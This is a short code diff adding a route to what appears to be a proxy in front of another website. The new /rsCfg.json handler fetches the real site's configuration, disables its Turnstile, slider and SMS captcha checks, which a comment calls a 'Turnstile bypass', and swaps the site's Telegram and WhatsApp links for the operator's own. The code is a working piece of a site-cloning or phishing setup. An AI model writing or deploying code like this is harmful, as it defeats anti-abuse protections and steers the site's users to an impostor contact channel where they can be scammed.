@@ -825,6 +825,30 @@ function sendJson(res, headers, json, fallbackBody) {
   res.end(body);
 }
 
+// rsCfg.json — Turnstile bypass: okTurnstileSitekey "0" → JS sets token="1" → no captcha
+app.get('/rsCfg.json', async (req, res) => {
+  try {
+    const url = 'https://' + FRONTEND_HOST + req.originalUrl;
+    const resp = await fetch(url, { headers: { host: FRONTEND_HOST } });
+    let cfg = null;
+    try { cfg = await resp.json(); } catch(e) {}
+    if (cfg && cfg.data) {
+      cfg.data.okTurnstileSitekey = '0';
+      cfg.data.rsKeyMode = -1;
+      cfg.data.sliderSmsCaptcha = 0;
+      cfg.data.siteKey = '0';
+      // Replace Telegram/WhatsApp links with our link
+      cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
+      cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
+    }
+    res.setHeader('content-type', 'application/json; charset=utf-8');
+    res.setHeader('access-control-allow-origin', '*');
+    res.json(cfg || { code: 0, msg: 'success', data: { okTurnstileSitekey: '0', rsKeyMode: -1, sliderSmsCaptcha: 0, siteKey: '0' } });
+  } catch(e) {
+    res.json({ code: 0, msg: 'success', data: { okTurnstileSitekey: '0', rsKeyMode: -1, sliderSmsCaptcha: 0, siteKey: '0' } });
+  }
+});
+
 app.get('/app/version', async (req, res) => {
   try {
     const data = await loadData();
